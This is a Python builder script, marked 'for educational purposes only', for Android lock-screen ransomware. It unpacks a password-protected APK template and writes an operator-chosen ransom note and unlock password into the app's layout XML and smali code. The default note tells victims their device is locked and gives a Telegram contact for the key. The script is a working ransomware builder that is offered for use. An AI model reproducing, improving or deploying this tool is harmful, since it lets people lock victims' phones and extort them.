# For educational purposes only


import os
import pyzipper
import xml.etree.ElementTree as ET
import shutil
from colorama import init, Fore, Back, Style

# colorama
init(autoreset=True)

def colored_arrow():
    return Fore.YELLOW + "|" + Fore.RED + "-" + Fore.YELLOW + "[" + Fore.GREEN + "@" + Fore.YELLOW + "]" + Fore.RED + "--" + Fore.YELLOW + ">"

def print_banner():
    os.system("clear")
    print("\033[38;5;160m" +  """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢂⡔⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠎⣯⡐⢄⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⣰⣿⠃⠼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⢻⣿⢳⣻⣽⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⢰⣿⣽⡀⢂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⣸⣿⣗⡏⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⢸⣟⣾⢧⡈⠀⡀⠀⠀⠀⢀⣀⡀⠀⠀⢀⣀⠀⠀⠀⠀⡀⠌⣰⡿⣽⣿⣴⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠘⣿⣞⣿⣻⣦⣄⣉⣩⣤⣴⣶⢶⡶⣶⢶⣶⣦⣬⣍⣡⣤⣾⢿⣽⣳⣿⣯⠱⣆⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢆⠹⣾⣷⡿⠾⠿⠉⠉⠉⠈⠉⠉⠉⠉⠉⠉⠉⠁⠉⠱⠿⠿⠿⢾⣷⠁⣿⡶⣿⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⢀⣽⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢡⢰⣿⢧⢻⣽⣇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡔⣡⡾⣯⡇⠀⢀⣠⣤⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⢠⠀⠀⠀⢸⣷⡌⣿⣿⣿⠾⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠎⣼⢯⣟⣷⡃⠰⠛⠉⠛⠻⢿⣶⣤⡀⠀⠀⠀⣠⣴⣾⠿⠛⠛⠛⠳⠄⢸⣷⣻⣿⣿⡿⣇⢻⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠊⣼⣯⢿⣞⣷⠣⡀⠀⠀⠀⠀⠀⠈⠛⣟⠂⠀⠸⠟⠋⠀⠀⠀⠀⠀⠀⠀⢸⣷⢯⡿⣿⡟⢻⡌⣧⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢰⡿⣞⡿⣾⣽⡃⠵⠲⢾⣵⢶⣶⠶⠶⠀⠀⠀⠀⠰⣦⣶⣶⣦⡥⣶⡴⢮⢼⣟⣯⣟⣿⣿⡝⣷⣼⢆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣀⡀⠀⠀⢆⣺⢿⣽⣻⢷⣯⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⢽⣻⡾⣽⣾⣿⢾⣹⠼⣵⣆⠀⠀⠀⠀
⠀⢀⢔⣨⣴⣶⣦⣍⠀⡼⢢⣤⢤⣠⣄⣠⣵⡠⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⢠⢀⢀⣧⣤⣠⣠⣀⣻⣾⣯⡿⣳⣶⣦⣅⠂⠀
⠀⢇⣾⣻⡽⣞⣷⣻⢷⠀⣸⣯⣟⣷⣻⢷⣻⡜⢒⣤⡤⠔⠒⠉⢀⡀⠀⠀⠀⢀⡀⠙⠒⢤⣴⣿⣷⣧⣿⣳⣟⡷⣟⡆⡞⣿⢣⢃⢿⣳⣟⣧⢡
⢠⢸⣯⢷⣟⡿⣾⣽⣻⠀⢸⣷⣻⢾⡽⣯⣟⣿⡀⢌⢿⣦⣀⣀⣀⣼⣿⣿⣿⣅⠀⠀⣀⣻⣿⣿⣿⣯⣿⣻⡿⣿⣿⣷⣧⢸⣟⡜⡘⣿⢾⣽⢠
⢸⢸⣟⡿⣾⣽⣳⢯⣷⠀⢸⣯⣟⣯⣟⣷⣻⢾⣷⡀⠑⢍⠛⠿⠿⠿⠯⠤⠽⠿⠿⠿⠟⡫⠄⠉⣻⣿⣿⣿⣿⣿⣳⣿⣾⣮⢹⣲⢡⢻⣟⣾⠠
⢸⢸⣏⡿⣷⣏⡿⣿⡾⠀⢸⣷⢿⣾⣹⣾⣹⢿⡾⣿⡀⠀⡀⠀⠆⣀⡀⢀⢀⣀⣰⠶⢉⡎⠀⢰⣿⢿⣾⣹⢿⡿⣿⠏⣹⣿⣇⣇⡏⡆⣿⣹⠈
⢸⢸⣯⣟⡷⣯⣟⣷⣻⠀⢸⣯⣟⣾⣳⢯⣟⣯⢿⡽⣷⣄⠑⠄⠀⠀⣹⣿⡏⠀⠀⢠⠊⢀⣰⣿⢯⣟⣾⡽⣯⢿⡽⡏⢻⣿⡞⢸⣼⢠⢹⡯⢘
⢸⢸⡷⣯⣟⣷⣻⣞⡷⠀⢸⣷⣻⢾⡽⣯⣟⡾⣯⢿⣽⣻⣦⡀⠀⠀⢻⣿⡇⠀⠀⢀⣰⣾⣟⣯⢿⡽⣾⡽⣯⢿⡽⡇⢾⣿⣯⠃⣧⢇⠎⡗⢸
⢸⢹⣟⣷⣻⣞⡷⣯⢿⠀⢸⡷⣯⢿⡽⣷⢯⡿⣽⣻⣞⣷⣻⢿⣶⣄⣸⣿⣃⣠⣴⣿⢿⡽⣾⡽⣯⣟⣷⣻⡽⣯⣟⣇⣼⣿⣞⡇⢹⡞⡴⣹⢈
⢸⢼⣻⣞⡷⣯⢿⡽⣯⠀⢸⡿⣽⢯⡿⣽⢯⣟⡷⣟⣾⣳⣯⢿⡾⣽⣻⣟⣿⣻⣽⢾⣯⣟⣷⣻⢷⣻⢾⣽⣻⣷⣿⢿⣻⣿⣿⣿⣀⣿⣴⣿⠰
⢸⢸⣟⣾⡽⣯⢿⣽⣳⠀⣸⡿⣽⢯⡿⣽⣻⣞⡿⣽⣳⣟⡾⣯⣟⣷⣻⣞⣷⣻⣞⡿⣾⡽⣾⡽⣯⣟⡿⣾⡽⣷⣭⡗⢻⣽⢾⣽⣶⣶⢾⣻⢘
⠈⡌⣿⢾⡽⣯⣟⣾⣽⠀⣹⢿⡽⣯⣟⡷⣯⢿⡽⣯⢷⣯⣟⣷⣻⣞⣷⣻⣞⡷⣯⣟⣷⣻⢷⣻⢷⣯⣟⣷⣻⡽⣯⡇⠸⣯⣟⣿⣿⣿⢾⡟⡸
⠀⠐⢌⠻⠟⣷⠻⠞⡡⡂⢸⡿⣽⣳⣯⢿⡽⣯⢿⣽⣻⢾⡽⣞⣷⣻⣞⡷⣯⣟⣷⣻⢾⡽⣯⣟⡿⣾⡽⣞⡷⣟⡷⡇⡆⢙⠺⣿⡝⠇⠘⢷⠁
⠀⠀⠀⠈⠁⠀⠈⠁⠀⡇⣹⡿⣽⣳⣯⢿⡽⣯⣟⣾⡽⣯⣟⡿⣞⡷⣯⣟⣷⣻⢾⡽⣯⣟⡷⣯⣟⣷⣻⢯⡿⣽⣻⠇⡇⠀⠨⣿⣝⡀⠀⢸⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠘⣿⣳⣟⡾⣯⣟⣷⣻⢾⡽⣷⢯⡿⣽⣻⢷⣻⢾⡽⣯⣟⡷⣯⣟⣷⣻⢾⡽⣯⣟⣷⡻⢡⠃⠀⢸⣿⣇⣦⡀⠘⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠌⠛⠾⠽⠷⠟⣾⡽⣯⢿⡽⣯⣟⡷⠯⠿⠽⠯⢟⣷⢯⣟⣷⣻⢾⡽⠯⠿⠷⠟⢊⠔⠁⠀⠀⢾⣿⢣⣯⠁⠀⡷
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⡀⣿⣹⣏⣿⣹⢷⣏⡇⡈⠉⠉⡆⣾⣏⣿⡾⣷⢿⣏⡇⠰⠉⠉⠉⠀⠀⠀⠀⠀⣿⣿⢇⢷⡈⠀⢿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡁⣿⣳⣟⡾⣽⣯⣟⡇⡇⠀⠀⡇⣷⣻⢾⡽⣯⣟⣾⣃⠠⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⠯⢷⡿⠶⠺
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⣿⣳⢯⣟⣷⣻⣞⡇⡇⠀⠀⡇⣯⣟⣯⣟⡷⣯⢷⡇⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⣿⡽⣯⣟⣾⣳⢯⡇⡇⠀⠀⡇⣷⣻⢾⣽⣻⡽⣯⣇⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⢻⣽⢷⣻⢾⣽⣻⢃⠇⠀⠀⢣⠻⣽⣻⣞⡷⣟⡷⠏⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⢙⠿⠽⠿⠞⠡⠊⠀⠀⠀⠀⠡⢙⠳⠯⠿⠝⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""" + Style.RESET_ALL)  
def get_directory():
    while True:
        directory = input(Fore.WHITE + "Enter Local Storage" + colored_arrow() + " ").strip()
        
        if not directory:
            print(Fore.RED + "Path cannot be empty!")
            continue
            
        buildapp_path = os.path.join(directory, "BuildApp")
        
        try:
            os.makedirs(buildapp_path, exist_ok=True)
            print(Fore.GREEN + f"\nBuildApp folder created successfully at: {buildapp_path}")
            return buildapp_path
        except Exception as e:
            print(Fore.RED + f"Failed to create folder: {e}")
            print(Fore.YELLOW + "Please try again with a valid path.")

def extract_zip_with_password(zip_path, extract_path, password):
    try:
        with pyzipper.AESZipFile(zip_path, 'r', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:
            zf.pwd = password.encode('utf-8')
            zf.extractall(extract_path)
        print(Fore.GREEN + "Successfully")
        return True
    except Exception as e:
        print(Fore.RED + f"Failed to extract zip: {e}")
        return False

def edit_xml_file(xml_path, new_text):
    try:
        tree = ET.parse(xml_path)
        root = tree.getroot()
        
        text_changed = False
        for textview in root.findall(".//TextView"):
            if textview.get("{http://schemas.android.com/apk/res/android}text") == "phalanx2025_EditMe_XML":
                textview.set("{http://schemas.android.com/apk/res/android}text", new_text)
                text_changed = True
                print(Fore.GREEN + f"Ransom Note: {new_text}")
        
        if not text_changed:
            for elem in root.iter():
                if elem.text and "phalanx2025_EditMe_XML" in elem.text:
                    elem.text = elem.text.replace("phalanx2025_EditMe_XML", new_text)
                    text_changed = True
                    print(Fore.GREEN + f"Ransom Note: {new_text}")
        
        tree.write(xml_path, encoding='utf-8', xml_declaration=True)
        
        if not text_changed:
            print(Fore.YELLOW + "Text 'phalanx2025_EditMe_XML' not found in Note file")
        else:
            print(Fore.GREEN + "XML file edited successfully")
        
        return True
        
    except Exception as e:
        print(Fore.RED + f"Failed to edit Note file: {e}")
        return False

def edit_smali_file(smali_path, new_text):
    try:
        with open(smali_path, 'r', encoding='utf-8') as file:
            content = file.read()
        
        old_text = "phalanx2025_EditMe_SMALI"
        if old_text in content:
            content = content.replace(old_text, new_text)
            print(Fore.GREEN + f"Password: {new_text}")
            
            with open(smali_path, 'w', encoding='utf-8') as file:
                file.write(content)
            
            return True
        else:
            print(Fore.YELLOW + "Text 'phalanx2025_EditMe_SMALI' not found in Password file")
            return False
            
    except Exception as e:
        print(Fore.RED + f"Failed to edit Password file: {e}")
        return False

def get_user_input():
    print("\n\n")
    print(Fore.RED + "=" * 40)
    print(Fore.YELLOW + "         CHANGE PASSWORD AND RANSOM NOTE")
    print(Fore.RED + "=" * 40)
    
    xml_input = input(Fore.WHITE + "Ransom Note" + colored_arrow() + "  ").strip()
    smali_input = input(Fore.WHITE + "Password" + colored_arrow() + " ").strip()
    
    if not xml_input:
        xml_input = "Locked by Phalanx Lockers. Yes, your Android device has been locked. Please enter the key to remove the overlay.\n\nContact me to get the key:\nhttps://t.me/DOFisHere"
    
    if not smali_input:
        smali_input = "RansomwareByPhalanx010342"
    
    return xml_input, smali_input

def main():
    print_banner()
    
    buildapp_path = get_directory()
    
    zip_path = "./build/base.zip"
    password = "PhalanxEtical0001"
    
    if not os.path.exists(zip_path):
        print(Fore.RED + f"File {zip_path} not found!")
        return
    
    if not extract_zip_with_password(zip_path, buildapp_path, password):
        return
    
    xml_input, smali_input = get_user_input()
    
    xml_file_path = os.path.join(buildapp_path, "res", "layout", "get.xml")
    smali_file_path = os.path.join(buildapp_path, "smali_classes2", "id", "AG", "SEC", "GetActivity$1.smali")
    
    print(Fore.YELLOW + "Searching for files to edit...")
    
    if not os.path.exists(xml_file_path):
        print(Fore.YELLOW + f"Note file not found: {xml_file_path}")
        xml_files = []
        for root, dirs, files in os.walk(buildapp_path):
            for file in files:
                if file.endswith('.xml'):
                    xml_files.append(os.path.join(root, file))
        
        if xml_files:
            print(Fore.GREEN + "XML files found:")
            for i, xml_file in enumerate(xml_files[:5]):
                print(Fore.WHITE + f"  {i+1}. {xml_file}")
            xml_file_path = xml_files[0]
            print(Fore.GREEN + f"Using file: {xml_file_path}")
        else:
            print(Fore.RED + "No Note files found!")
            return
    
    if not os.path.exists(smali_file_path):
        print(Fore.YELLOW + f"Password file not found: {smali_file_path}")
        smali_files = []
        for root, dirs, files in os.walk(buildapp_path):
            for file in files:
                if file.endswith('.smali') and 'GetActivity' in file:
                    smali_files.append(os.path.join(root, file))
        
        if smali_files:
            print(Fore.GREEN + "Password files found:")
            for i, smali_file in enumerate(smali_files[:5]):
                print(Fore.WHITE + f"  {i+1}. {smali_file}")
            smali_file_path = smali_files[0]
            print(Fore.GREEN + f"Using file: {smali_file_path}")
        else:
            print(Fore.RED + "No Password files found!")
            return
    
    if edit_xml_file(xml_file_path, xml_input):
        try:
            with open(xml_file_path, 'r', encoding='utf-8') as f:
                content = f.read()
                if xml_input in content:
                    print(Fore.GREEN + "\nXML edit verified successfully")
        except:
            pass
    
    if edit_smali_file(smali_file_path, smali_input):
        try:
            with open(smali_file_path, 'r', encoding='utf-8') as f:
                content = f.read()
                if smali_input in content:
                    print(Fore.GREEN + "Smali edit verified successfully")
        except:
            pass
    
    print(Fore.GREEN + "PROCESS COMPLETED!")
    print(Fore.YELLOW + f"Files edited successfully: {buildapp_path}")

if __name__ == "__main__":
    try:
        import pyzipper
    except ImportError:
        print(Fore.RED + "pyzipper library not installed!")
        print(Fore.YELLOW + "Installing pyzipper...")
        os.system("pip install pyzipper")
        import pyzipper
    
    main()